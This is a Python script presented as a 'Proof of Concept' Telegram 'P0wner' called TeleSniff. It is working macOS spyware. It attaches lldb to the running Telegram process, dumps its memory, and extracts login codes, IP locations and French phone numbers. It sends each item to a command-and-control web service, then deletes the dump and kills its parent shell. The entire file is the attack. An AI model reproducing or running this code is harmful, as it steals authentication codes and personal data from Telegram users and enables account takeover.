#!/usr/bin/env	python
# -*- coding: utf-8 -*-
# 1.0
# This is a Proof of Concept
# Process Telegram core P0wner

import sys,os
import requests
import subprocess
import uuid
import signal
import psutil
import time
from colorama import Fore, Back, Style

phone = []
phone_start = ['6','7']
code_connexion = []
last_location = []
COMMAND = "http://URL_OF_WEB/webservice"
PROCNAME = "Telegram"
FNULL = open(os.devnull, 'w')


def logo():
	print """
████████╗███████╗██╗     ███████╗███████╗███╗   ██╗██╗███████╗███████╗
╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝████╗  ██║██║██╔════╝██╔════╝
   ██║   █████╗  ██║     █████╗  ███████╗██╔██╗ ██║██║█████╗  █████╗  
   ██║   ██╔══╝  ██║     ██╔══╝  ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  
   ██║   ███████╗███████╗███████╗███████║██║ ╚████║██║██║     ██║     
   ╚═╝   ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     
  """+Fore.RED + """ TWITTER: """+Style.RESET_ALL+""" @GRANIET75 && """+Fore.RED + """GITHUB:"""+Style.RESET_ALL+""" GRANIET 
"""

def dump_numbers(country_code, core_dump):
	for line in core_dump:
		if country_code in line:
			line = line.strip().split('33')[1]
			if len(line) > 8:
				possible = line[:9]
				if possible.isdigit():
					nothing = 0
					for char in possible:
						if nothing == 1:
							break
						if possible.count(char) >= 4:
							nothing = 1
					if nothing == 0:
						phone_nb = '+33' + possible
						if not phone_nb in phone:
							if possible[:1] in phone_start:
								insert_result_api('contact', phone_nb)
								phone.append(phone_nb)


def getpid():
	print Fore.YELLOW + "[INFO] Getting PID" + Style.RESET_ALL
	for proc in psutil.process_iter():
		if proc.name() == PROCNAME:
			return str(proc.pid)
def get_core_(random_str):
	pid = getpid()
	print Fore.YELLOW + "[INFO] Malware Installation..." + Style.RESET_ALL
	try:
		subprocess.Popen(["lldb","-p" + pid, "--batch", '-o', 'process save-core /tmp/' + random_str + ".txt"],stdout=FNULL, stderr=subprocess.STDOUT)
		return True
	except:
		print Fore.RED + "[error] can't parse Core Dump." + Style.RESET_ALL
		return False
	return True

def check_lldb():
	print Fore.YELLOW + "[INFO] Checking system..." + Style.RESET_ALL
	try:
		subprocess.call(["lldb","--batch"], stdout=FNULL, stderr=subprocess.STDOUT)
		return True
	except OSError as e:
		if e.errno == os.errno.ENOENT:
			print Fore.RED + "(exiting) This PoC is for OSX" + Style.RESET_ALL
			sys.exit()
		else:
			print Fore.RED + "(exiting) This PoC is for OSX" + Style.RESET_ALL
			sys.exit()
			raise

def connect_cc():
	print Fore.YELLOW + "[INFO] Try to connect to C&C..." + Style.RESET_ALL
	try:
		requests.get(COMMAND + "/api.php?load=1")
	except:
		print Fore.RED + "[ERROR] Can't load C&C" + Style.RESET_ALL
		sys.exit()
	print Fore.GREEN + "[INFO] TELESNIFF loaded with HijackGRAM" + Style.RESET_ALL

def insert_result_api(process,result):
	if process != "" and result != "":
		try:
			requests.get(COMMAND + "/api.php?result="+str(result)+"&process_name="+str(process)+"&cmd=insert")
		except:
			print Fore.RED + "[ERROR] Can't insert data" + Style.RESET_ALL
def main():
	status = "[INFO] Start extraction data"
	action = 0
	os.system('clear')
	logo()
	print Fore.BLUE + "[INFO] Welcome to TeleSniff" + Style.RESET_ALL
	connect_cc()
	random_ram = str(uuid.uuid4())
	check_require = check_lldb()
	file_name = '/tmp/' + random_ram + ".txt"
	core = get_core_(random_ram)
	if not core:
		sys.exit()
	time.sleep(10)
	if os.path.isfile(file_name):
		time.sleep(0.3)
		size = os.path.getsize(file_name)
		while action == 0:
			time.sleep(0.6)
			sys.stderr.flush()
			sys.stderr.write('\r'+status)
			f =  open(file_name,'r')
			for line in f:
				line =  line.decode('utf-8','ignore').encode("utf-8")
				if "Location:" in line and "IP = " in line:
					location = line.split('Location:')[1].split('If this wasn')[0].strip()
					if location not in last_location:
						insert_result_api('location', str(location.split('IP =')[1].split(')')[0]))
						last_location.append(location)
				elif "Your login code: " in line:
					line = line.split('code:')[1].split('This code')[0]
					code = line.strip()
					if not code in code_connexion:
						if "line" not in code:
							insert_result_api('authcode', code)
							code_connexion.append(code)
				if "33" in line:
					line = line.split(' ')
					dump_numbers('33', line)
			size_l = os.path.getsize(file_name)
			if size == size_l:
				action =  1
			else:
				size = size_l
			status = status + "."
			sys.stdout.flush()
	else:
		print "can't look file"
	os.remove(file_name)
	os.kill(os.getppid(), signal.SIGHUP)


main()
